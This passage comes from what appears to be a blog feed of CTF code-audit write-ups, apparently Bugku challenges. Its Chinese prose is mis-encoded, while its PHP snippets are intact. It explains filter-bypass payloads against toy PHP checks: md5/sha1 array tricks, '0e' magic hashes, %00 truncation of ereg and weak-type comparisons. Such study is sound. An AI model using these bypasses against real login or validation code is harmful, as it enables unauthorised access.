çš„å€¼ä¸èƒ½ä¸ºhackerDJ</p><div class="hljs"><pre><code class="hljs php">$_GET[id] = urldecode($_GET[id]);<span class="hljs-keyword">if</span>($_GET[id] == <span class="hljs-string">"hackerDJ"</span>) <span class="hljs-comment">//è¦ç¼–ç çš„å­—ç¬¦ä¸²hackerDJ</span></code></pre></div><p>GETä¼šæäº¤æ—¶è¿›è¡Œä¸€æ¬¡urlencode</p><p>urldecode()äºurlencode()æ˜¯ä¸€å¯¹æƒ³åä½œç”¨çš„å‡½æ•°ï¼Œä¸€ä¸ªè§£ç ä¸€ä¸ªç¼–ç ã€‚</p><p><code>$_GET[id] = urldecode($_GET[id])</code>     urldecodeåçš„<strong>$_GET[id]</strong> å¤åˆ¶ç»™è‡ªå·±ç­‰äºhackerDJ</p><p>æ‰€ä»¥å¯¹hackerDJ è¿›è¡Œä¸¤æ¬¡urlencode, ä¸ºäº†ç»•è¿‡è¿‡æ»¤ï¼›è¿›è¡Œä¸€æ¬¡urldecodeåå…¶å€¼å’ŒhackerDJç›¸ç­‰ï¼Œå¾—åˆ°flag</p><p><code>?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41</code></p><h2 id="md5-å‡½æ•°"><a href="#md5-å‡½æ•°" class="headerlink" title="md5()å‡½æ•°"></a>md5()å‡½æ•°</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);$flag = <span class="hljs-string">'flag&#123;test&#125;'</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'username'</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'password'</span>])) &#123;<span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">'username'</span>] == $_GET[<span class="hljs-string">'password'</span>])<span class="hljs-keyword">print</span> <span class="hljs-string">'Your password can not be your username.'</span>;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (md5($_GET[<span class="hljs-string">'username'</span>]) === md5($_GET[<span class="hljs-string">'password'</span>]))<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);<span class="hljs-keyword">else</span><span class="hljs-keyword">print</span> <span class="hljs-string">'Invalid password'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>åˆ©ç”¨md5ä¸èƒ½å¤„ç†æ•°ç»„çš„ç‰¹æ€§ç»•è¿‡</p><p><a href="https://www.w3school.com.cn/php/func_string_md5.asp" target="_blank" rel="noopener">md5()</a></p><p>md5å‡½æ•°é‡åˆ°æ•°ç»„ç±»å‹çš„å‚æ•°æ—¶ï¼Œè¿”å›å€¼ä¸ºnullï¼Œnull===null,æ‰€ä»¥æ»¡è¶³<code>md5($_GET[&#39;username&#39;]) === md5($_GET[&#39;password&#39;]</code></p><div class="hljs"><pre><code class="hljs angelscript">GET:/?username[]=<span class="hljs-number">1</span>&amp;password[]=<span class="hljs-number">2</span></code></pre></div><h2 id="æ•°ç»„è¿”å›NULLç»•è¿‡"><a href="#æ•°ç»„è¿”å›NULLç»•è¿‡" class="headerlink" title="æ•°ç»„è¿”å›NULLç»•è¿‡"></a>æ•°ç»„è¿”å›NULLç»•è¿‡</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag = <span class="hljs-string">"flag"</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> ($_GET[<span class="hljs-string">'password'</span>])) &#123;<span class="hljs-keyword">if</span> (ereg (<span class="hljs-string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="hljs-string">'password'</span>]) === <span class="hljs-keyword">FALSE</span>) <span class="hljs-comment">//è¿›è¡Œè¿‡æ»¤ï¼Œpasswordå¿…é¡»åŒ…å«å­—æ¯å’Œæ•°å­—</span><span class="hljs-keyword">echo</span> <span class="hljs-string">'You password must be alphanumeric'</span>;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">'password'</span>], <span class="hljs-string">'--'</span>) !== <span class="hljs-keyword">FALSE</span>)<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span> . $flag);<span class="hljs-keyword">else</span><span class="hljs-keyword">echo</span> <span class="hljs-string">'Invalid password'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>æç¤ºæ˜¯æ•°ç»„è¿”å›NULL</p><p>ç›´æ¥å°è¯•æäº¤<code>?password[]=</code>ï¼Œflagå°±å‡ºæ¥äº†</p><p>äº†è§£ä¸€ä¸‹åŸç†ï¼Œ</p><blockquote><p>ä»£ç ç›¸å…³çŸ¥è¯†ç‚¹é“¾æ¥å¦‚ä¸‹ï¼š</p><p>issetå‡½æ•°ï¼š<a href="http://php.net/manual/zh/function.isset.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.isset.php</a></p><p>eregå‡½æ•°ï¼š<a href="http://www.php.net/manual/zh/function.ereg.php" target="_blank" rel="noopener">http://www.php.net/manual/zh/function.ereg.php</a></p><p>strposå‡½æ•°ï¼š<a href="http://www.w3school.com.cn/php/func_string_strpos.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_string_strpos.asp</a></p><p>â€œ[A-Za-z0-9]â€<br>æ–¹æ‹¬å·è¡¨ç¤ºå­—ç¬¦é›†ï¼Œ[A-Za-z0-9]åŒ¹é…å¤§å°å†™å­—æ¯å’Œæ•°å­—å…¶ä¸­ä¸€ä¸ªå­—ç¬¦</p><p>â€œ^[A-Za-z0-9]$â€<br>^è¡¨ç¤ºå­—ç¬¦ä¸²å¼€å§‹ï¼Œ$è¡¨ç¤ºå­—ç¬¦ä¸²ç»“æŸ ï¼Œè¿™ä¸ªåŒ¹é…åªæœ‰ä¸€ä¸ªå¤§å°å†™å­—æ¯å’Œæ•°å­—å­—ç¬¦çš„å­—ç¬¦ä¸²</p><p>â€œ^[A-Za-z0-9]+$â€<br>+å·è¡¨ç¤ºé‡å¤1åˆ°å¤šæ¬¡ï¼ŒåŒ¹é…ç”±å¤šä¸ªæ•°å­—å¤§å°å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²</p></blockquote><p><img src="https://i.loli.net/2020/11/28/2EjrzqhlvA4pcRg.png" srcset="/img/loading.gif" alt="ereg.png"></p><p><img src="https://i.loli.net/2020/11/28/yMSHUw8EcGd9izo.png" srcset="/img/loading.gif" alt="strpos.png"></p><p>å€¼å¾—æ³¨æ„çš„æ˜¯è¿™ä¸¤ä¸ªå‡½æ•°èƒ½å¤„ç†çš„å‚æ•°éƒ½æ˜¯stringç±»å‹</p><div class="hljs"><pre><code class="hljs php">eregåªèƒ½å¤„ç†å­—ç¬¦ï¼Œrå¦‚æœæ•°ç»„ï¼Œåˆ™è¿”å›çš„æ˜¯<span class="hljs-keyword">null</span>ï¼Œä¸‰ä¸ªç­‰å·çš„æ—¶å€™ä¸ä¼šè¿›è¡Œç±»å‹è½¬æ¢ã€‚æ‰€ä»¥<span class="hljs-keyword">null</span>ä¸ç­‰äº<span class="hljs-keyword">false</span>ã€‚strposçš„å‚æ•°åŒæ ·ä¸èƒ½å¤Ÿæ˜¯æ•°ç»„ï¼Œæ‰€ä»¥è¿”å›çš„ä¾æ—§æ˜¯<span class="hljs-keyword">null</span>ï¼Œ<span class="hljs-keyword">null</span>ä¸ç­‰äº<span class="hljs-keyword">false</span>ä¹Ÿæ˜¯æ­£ç¡®ã€‚</code></pre></div><p>æ•…?password[]=å¯ä»¥ç»•è¿‡ã€‚</p><p>ä½†æ˜¯è¿˜æœ‰ä¸€ç§ä¸º%00æˆªæ–­</p><p><code>?password=d%00--</code></p><h2 id="å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡"><a href="#å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡" class="headerlink" title="å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡"></a>å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡</h2><div class="hljs"><pre><code class="hljs php">$temp = $_GET[<span class="hljs-string">'password'</span>];is_numeric($temp)?<span class="hljs-keyword">die</span>(<span class="hljs-string">"no numeric"</span>):<span class="hljs-keyword">NULL</span>;<span class="hljs-keyword">if</span>($temp&gt;<span class="hljs-number">1336</span>)&#123;<span class="hljs-keyword">echo</span> $flag;</code></pre></div><p>é¢˜ç›®è¯´äº†å¼±ç±»å‹æ¯”è¾ƒç»•è¿‡</p><p>payloadï¼š</p><div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">password</span>=<span class="hljs-number">1444</span>b</code></pre></div><p>é¦–å…ˆåœ¨is_numeric()æ£€æŸ¥æ—¶ï¼Œå› ä¸º1444bä¸­åŒ…å«äº†å­—æ¯bæ‰€ä»¥ä¸ä¼šè®¤ä¸ºæ˜¯æ•°å­—ç±»å‹</p><p>åœ¨åˆ¤æ–­æ˜¯å¦å¤§äº1336æ—¶ï¼Œphpé»˜è®¤1444bæ˜¯æ•°å­—ç±»å‹ï¼Œæ‰€ä»¥å¤§äº1336</p><h2 id="sha-å‡½æ•°æ¯”è¾ƒç»•è¿‡"><a href="#sha-å‡½æ•°æ¯”è¾ƒç»•è¿‡" class="headerlink" title="sha()å‡½æ•°æ¯”è¾ƒç»•è¿‡"></a>sha()å‡½æ•°æ¯”è¾ƒç»•è¿‡</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag = <span class="hljs-string">"flag"</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'name'</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'password'</span>]))&#123;   var_dump($_GET[<span class="hljs-string">'name'</span>]);    <span class="hljs-keyword">echo</span> <span class="hljs-string">""</span>;   var_dump($_GET[<span class="hljs-string">'password'</span>]);   var_dump(sha1($_GET[<span class="hljs-string">'name'</span>]));   var_dump(sha1($_GET[<span class="hljs-string">'password'</span>]));       <span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">'name'</span>] == $_GET[<span class="hljs-string">'password'</span>])<span class="hljs-keyword">echo</span> <span class="hljs-string">'Your password can not be your name!'</span>;   <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1($_GET[<span class="hljs-string">'name'</span>]) === sha1($_GET[<span class="hljs-string">'password'</span>]))    <span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);   <span class="hljs-keyword">else</span>    <span class="hljs-keyword">echo</span> <span class="hljs-string">'Invalid password.'</span>;&#125;<span class="hljs-keyword">else</span><span class="hljs-keyword">echo</span> <span class="hljs-string">'Login first!'</span>;<span class="hljs-meta">?&gt;</span></code></pre></div><p>ä»£ç é€»è¾‘å¾ˆç®€å•ï¼Œé¦–å…ˆåˆ¤æ–­æ˜¯å¦getæ–¹å¼ä¼ é€’nameå’Œpasswordå‚æ•°</p><p>var_dumpï¼Œè¾“å‡ºå‚æ•°ç±»å‹å’Œå€¼</p><p>ä¹‹åå¦‚æœé€šè¿‡ifåˆ¤æ–­åˆ™å¯ä»¥æ‹¿åˆ°flag</p><p>ifåˆ¤æ–­çš„æ¡ä»¶</p><blockquote><p>nameå’Œpasswordä¸èƒ½ç›¸åŒ</p><p>ä½†æ˜¯sha1(name)===sha1(password)</p></blockquote><p>è¿™é‡Œå¯ä»¥ä½¿ç”¨sha1å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„çš„æ¼æ´ç»•è¿‡ï¼Œsha1é‡åˆ°å‚æ•°ä¸ºæ•°ç»„ç±»å‹æ—¶è¿”å›å€¼ä¸º0</p><p>payloadï¼š</p><div class="hljs"><pre><code class="hljs angelscript">GET:?name[]=<span class="hljs-number">1</span>&amp;password[]=<span class="hljs-number">2</span></code></pre></div><h2 id="md5åŠ å¯†ç›¸ç­‰ç»•è¿‡"><a href="#md5åŠ å¯†ç›¸ç­‰ç»•è¿‡" class="headerlink" title="md5åŠ å¯†ç›¸ç­‰ç»•è¿‡"></a>md5åŠ å¯†ç›¸ç­‰ç»•è¿‡</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$md51 = md5(<span class="hljs-string">'QNKCDZO'</span>);$a = @$_GET[<span class="hljs-string">'a'</span>];$md52 = @md5($a);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($a))&#123;<span class="hljs-keyword">if</span> ($a != <span class="hljs-string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"flag&#123;*&#125;"</span>;&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"false!!!"</span>;&#125;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">"please input a"</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>å³ä½¿ç”¨getæ–¹å¼ä¼ é€’ä¸€ä¸ªå‚æ•°a,ä½¿å¾—açš„å€¼ä¸ç­‰äº<code>QNKCDZO</code>ä½†æ˜¯äºŒè€…çš„md5å€¼ç›¸åŒ</p><p>PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€!=â€æˆ–â€==â€æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0ã€‚</p><p>å¸¸è§çš„payloadæœ‰</p><div class="hljs"><pre><code class="hljs stylus">QNKCDZO<span class="hljs-number">240610708</span>s878926199as155964671as214587387as214587387a<span class="hljs-comment">//ä¸‹é¢æ˜¯sha1()åŠ å¯†å ==ç›¸ç­‰çš„å­—ç¬¦ä¸²</span> sha1(str)<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">'aaroZmOk'</span>)</span></span>  <span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">'aaK1STfY'</span>)</span></span><span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">'aaO8zKZF'</span>)</span></span><span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">'aa3OFF9m'</span>)</span></span></code></pre></div><p>payload:</p><div class="hljs"><pre><code class="hljs routeros">GET:?<span class="hljs-attribute">a</span>=240610708</code></pre></div><h2 id="åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ"><a href="#åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ" class="headerlink" title="åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ"></a>åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">noother_says_correct</span><span class="hljs-params">($temp)</span></span><span class="hljs-function"></span>&#123;$flag = <span class="hljs-string">'flag&#123;test&#125;'</span>;$one = ord(<span class="hljs-string">'1'</span>); <span class="hljs-comment">//ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼</span>$nine = ord(<span class="hljs-string">'9'</span>); <span class="hljs-comment">//ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼</span>$number = <span class="hljs-string">'3735929054'</span>;<span class="hljs-comment">// Check all the input characters!</span><span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; strlen($number); $i++)&#123;<span class="hljs-comment">// Disallow all the digits!</span>$digit = ord($temp&#123;$i&#125;);<span class="hljs-keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )&#123;<span class="hljs-comment">// Aha, digit not allowed!</span><span class="hljs-keyword">return</span> <span class="hljs-string">"flase"</span>;&#125;&#125;<span class="hljs-keyword">if</span>($number == $temp)<span class="hljs-keyword">return</span> $flag;&#125;$temp = $_GET[<span class="hljs-string">'password'</span>];<span class="hljs-keyword">echo</span> noother_says_correct($temp);<span class="hljs-meta">?&gt;</span></code></pre></div><p>é‡ç‚¹åœ¨è¿™æ®µä»£ç </p><div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )&#123;<span class="hljs-comment">// Aha, digit not allowed!</span><span class="hljs-keyword">return</span> <span class="hljs-string">"flase"</span>;&#125;&#125;<span class="hljs-keyword">if</span>($number == $temp)<span class="hljs-keyword">return</span> $flag;&#125;</code></pre></div><p>è¾“å…¥çš„æ•°å­—ä¸­ä¸èƒ½åŒ…å«1-9çš„æ•°å­—</p><p>å¦‚æœè¾“å…¥çš„æ•°å­—å’Œç›¸ç­‰åˆ™æ‹¿åˆ°flag</p><p>å¯ä»¥æƒ³åˆ°çš„æ˜¯å°†è¿™æ®µæ•°å­—è½¬æ¢ä¸ºåå…­è¿›åˆ¶</p><div class="hljs"><pre><code class="hljs angelscript">hex(<span class="hljs-number">3735929054</span>)=<span class="hljs-number">0xdeadc0de</span>GET:password=<span class="hljs-number">0xdeadc0de</span></code></pre></div><h2 id="å˜é‡è¦†ç›–"><a href="#å˜é‡è¦†ç›–" class="headerlink" title="å˜é‡è¦†ç›–"></a>å˜é‡è¦†ç›–</h2><p>ç½‘å€æ‰“ä¸å¼€</p><h2 id="eregæ­£åˆ™-00æˆªæ–­"><a href="#eregæ­£åˆ™-00æˆªæ–­" class="headerlink" title="eregæ­£åˆ™%00æˆªæ–­"></a>eregæ­£åˆ™%00æˆªæ–­</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag = <span class="hljs-string">"xxx"</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> ($_GET[<span class="hljs-string">'password'</span>]))&#123;<span class="hljs-keyword">if</span> (ereg (<span class="hljs-string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="hljs-string">'password'</span>]) === <span class="hljs-keyword">FALSE</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">'You password must be alphanumeric'</span>;&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strlen($_GET[<span class="hljs-string">'password'</span>]) &lt; <span class="hljs-number">8</span> &amp;&amp; $_GET[<span class="hljs-string">'password'</span>] &gt; <span class="hljs-number">9999999</span>)&#123;<span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">'password'</span>], <span class="hljs-string">'-'</span>) !== <span class="hljs-keyword">FALSE</span>) <span class="hljs-comment">//strpos â€” æŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®</span>&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span> . $flag);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-string">'- have not been found'</span>);&#125;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">'Invalid password'</span>;&#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>ç»•è¿‡ä¸‰ä¸ªifè¯­å¥å³å¯æ‹¿åˆ°flag</p><p>ç¬¬ä¸€ä¸ª</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (ereg (<span class="hljs-string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="hljs-string">'password'</span>]) === <span class="hljs-keyword">FALSE</span>)</code></pre></div><p>è¿™ä¸ªæ¯”è¾ƒå¸¸è§çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œä¹Ÿå¾ˆå®¹æ˜“ç†è§£</p><p><code>[a-zA-Z0-9]+</code>åŒ…å«å¤§å°å†™å­—ç¬¦å’Œæ•°å­—ï¼Œ^æ˜¯åŒ¹é…å¼€å§‹æ ‡å¿—ï¼Œ$æ˜¯åŒ¹é…ç»“æŸæ ‡å¿—</p><p>ç¬¬äºŒä¸ª</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (strlen($_GET[<span class="hljs-string">'password'</span>]) &lt; <span class="hljs-number">8</span> &amp;&amp; $_GET[<span class="hljs-string">'password'</span>] &gt; <span class="hljs-number">9999999</span>)</code></pre></div><p>passwordå­—æ®µé•¿åº¦å°äº8ï¼Œä½†æ˜¯å¤§äº9999999ï¼Œå¯ä»¥ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•</p><p>ç¬¬ä¸‰ä¸ª</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">'password'</span>], <span class="hljs-string">'-'</span>) !== <span class="hljs-keyword">FALSE</span>)</code></pre></div><p>passwordè¦åŒ…å« <code>-</code>ï¼ˆåšé¢˜çš„æ—¶å€™ä¼šå‘ç°åº”è¯¥æ˜¯<code>*-*</code>ï¼‰</p><p>payload</p><div class="hljs"><pre><code class="hljs angelscript">GET:password=<span class="hljs-number">1e9</span>%<span class="hljs-number">00</span>*-*</code></pre></div><p><img src="https://i.loli.net/2020/11/28/xcjep86YFtWgXMk.png" srcset="/img/loading.gif" alt="zhengze.png"></p><h2 id="strposæ•°ç»„ç»•è¿‡"><a href="#strposæ•°ç»„ç»•è¿‡" class="headerlink" title="strposæ•°ç»„ç»•è¿‡"></a>strposæ•°ç»„ç»•è¿‡</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag = <span class="hljs-string">"flag"</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> ($_GET[<span class="hljs-string">'ctf'</span>])) &#123;<span class="hljs-keyword">if</span> (@ereg (<span class="hljs-string">"^[1-9]+$"</span>, $_GET[<span class="hljs-string">'ctf'</span>]) === <span class="hljs-keyword">FALSE</span>)<span class="hljs-keyword">echo</span> <span class="hljs-string">'å¿…é¡»è¾“å…¥æ•°å­—æ‰è¡Œ'</span>;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">'ctf'</span>], <span class="hljs-string">'#biubiubiu'</span>) !== <span class="hljs-keyword">FALSE</span>)<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);<span class="hljs-keyword">else</span><span class="hljs-keyword">echo</span> <span class="hljs-string">'éªšå¹´ï¼Œç»§ç»­åŠªåŠ›å§å•Š~'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>ç›´æ¥åˆ©ç”¨eregå’Œstrposå‡½æ•°ä¸èƒ½å¤„ç†æ•°ç»„çš„ç‰¹æ€§ç»•è¿‡</p><p>å½“è¾“å…¥ctf[]=11æ—¶ï¼Œeregè¿”å›å€¼null!==FALSE</p><p>strposè¿”å›å€¼ä¹Ÿä¸ºnull!=FALSE</p><p>æ‹¿åˆ°flag</p><p>payloadï¼š</p><div class="hljs"><pre><code class="hljs angelscript">GET:?ctf[]=<span class="hljs-number">111</span><span class="hljs-comment">//æ­£å¸¸åšæ³•</span>?nctf=<span class="hljs-number">1</span>%<span class="hljs-number">00</span>%<span class="hljs-number">23</span>biubiubiu</code></pre></div><h2 id="æ•°å­—éªŒè¯æ­£åˆ™ç»•è¿‡"><a href="#æ•°å­—éªŒè¯æ­£åˆ™ç»•è¿‡" class="headerlink" title="æ•°å­—éªŒè¯æ­£åˆ™ç»•è¿‡"></a>æ•°å­—éªŒè¯æ­£åˆ™ç»•è¿‡</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);$flag = <span class="hljs-string">'flag&#123;test&#125;'</span>;<span class="hljs-keyword">if</span> (<span class="hljs-string">"POST"</span> == $_SERVER[<span class="hljs-string">'REQUEST_METHOD'</span>])&#123;$password = $_POST[<span class="hljs-string">'password'</span>];<span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> &gt;= preg_match(<span class="hljs-string">'/^[[:graph:]]&#123;12,&#125;$/'</span>, $password)) <span class="hljs-comment">//preg_match â€” æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ¹é… é•¿åº¦å¤§äº12</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">'flag'</span>;<span class="hljs-comment">//è¿™é‡Œè¾“å‡ºçš„æ˜¯å‡flag çœŸçš„åœ¨ä¸‹é¢</span><span class="hljs-keyword">exit</span>;&#125;<span class="hljs-keyword">while</span> (<span class="hljs-keyword">TRUE</span>)&#123;$reg = <span class="hljs-string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>;<span class="hljs-keyword">if</span> (<span class="hljs-number">6</span> &gt; preg_match_all($reg, $password, $arr))<span class="hljs-keyword">break</span>;$c = <span class="hljs-number">0</span>;$ps = <span class="hljs-keyword">array</span>(<span class="hljs-string">'punct'</span>, <span class="hljs-string">'digit'</span>, <span class="hljs-string">'upper'</span>, <span class="hljs-string">'lower'</span>);   <span class="hljs-comment">//[[:punct:]] ä»»ä½•æ ‡ç‚¹ç¬¦å· [[:digit:]] ä»»ä½•æ•°å­— [[:upper:]] ä»»ä½•å¤§å†™å­—æ¯ [[:lower:]] ä»»ä½•å°å†™å­—æ¯</span><span class="hljs-keyword">foreach</span> ($ps <span class="hljs-keyword">as</span> $pt)&#123;<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/[[:$pt:]]+/"</span>, $password))$c += <span class="hljs-number">1</span>;&#125;<span class="hljs-keyword">if</span> ($c &lt; <span class="hljs-number">3</span>) <span class="hljs-keyword">break</span>;<span class="hljs-comment">//&gt;=3ï¼Œå¿…é¡»åŒ…å«å››ç§ç±»å‹ä¸‰ç§ä¸ä¸‰ç§ä»¥ä¸Š</span><span class="hljs-keyword">if</span> (<span class="hljs-string">"42"</span> == $password) <span class="hljs-keyword">echo</span> $flag;<span class="hljs-keyword">else</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">'Wrong password'</span>;<span class="hljs-keyword">exit</span>;&#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>ä»£ç è¿˜æŒºé•¿ï¼Œä½†æ˜¯ç›´æ¥æŠ“ä½é‡ç‚¹</p><div class="hljs"><pre><code class="hljs lisp">if (<span class="hljs-number">0</span> &gt;= preg_match('/^[[<span class="hljs-symbol">:graph</span>:]]&#123;<span class="hljs-number">12</span>,&#125;$/', $password))</code></pre></div><p>[:graph]æ˜¯æ‰€æœ‰å¯æ‰“å°çš„å­—ç¬¦,{12,},æ˜¯åœ¨passwordä¸­åŒ¹é…12æ¬¡ä»¥ä¸Šï¼Œå³passwordçš„é•¿åº¦å¤§äº12</p><p>ä¸‹é¢çš„æ­£åˆ™</p><div class="hljs"><pre><code class="hljs php">$ps = <span class="hljs-keyword">array</span>(<span class="hljs-string">'punct'</span>, <span class="hljs-string">'digit'</span>, <span class="hljs-string">'upper'</span>, <span class="hljs-string">'lower'</span>);   <span class="hljs-comment">//[[:punct:]] ä»»ä½•æ ‡ç‚¹ç¬¦å· [[:digit:]] ä»»ä½•æ•°å­— [[:upper:]] ä»»ä½•å¤§å†™å­—æ¯ [[:lower:]] ä»»ä½•å°å†™å­—æ¯</span><span class="hljs-keyword">foreach</span> ($ps <span class="hljs-keyword">as</span> $pt)&#123;<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/[[:$pt:]]+/"</span>, $password))$c += <span class="hljs-number">1</span>;&#125;</code></pre></div><p>è¦æ±‚passwordä¸­å¿…é¡»åŒ…å«ä¸‰ç§ä»¥ä¸Šçš„ç±»å‹çš„å­—ç¬¦ï¼Œäºæ˜¯æ­£å¸¸æ„é€ å¦‚ä¸‹çš„payload</p><div class="hljs"><pre><code class="hljs angelscript">POST:password=<span class="hljs-number">42</span>adad;d;;a<span class="hljs-comment">//éæ­£å¸¸çš„</span>password=<span class="hljs-number">42</span>%<span class="hljs-number">00</span>æˆ–è€…POSTä¸€ä¸ªä»»æ„ä¸ç­‰äºpasswordçš„å­—ç¬¦æš‚æ—¶ä¸çŸ¥é“ä»€ä¹ˆåŸå› å¯¼è‡´çš„</code></pre></div><p><img src="https://i.loli.net/2020/11/28/euJc6DPKCZ4a5bY.png" srcset="/img/loading.gif" alt="shuzi2.png"></p><p><img src="https://i.loli.net/2020/11/28/HwsChaXMRFWmjeA.png" srcset="/img/loading.gif" alt="shuzi1.png"></p><h2 id="ç®€å•waf"><a href="#ç®€å•waf" class="headerlink" title="ç®€å•waf"></a>ç®€å•waf</h2><p>ç½‘å€æ‰“ä¸å¼€</p>]]></content>
    
    
    <categories>
      
      <category>ä»£ç å®¡è®¡</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å˜é‡è¦†ç›–</tag>
      
      <tag>å‡½æ•°æ¼æ´</tag>
      
      <tag>ç»•è¿‡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bugkuåˆ·é¢˜è®°å½•2</title>
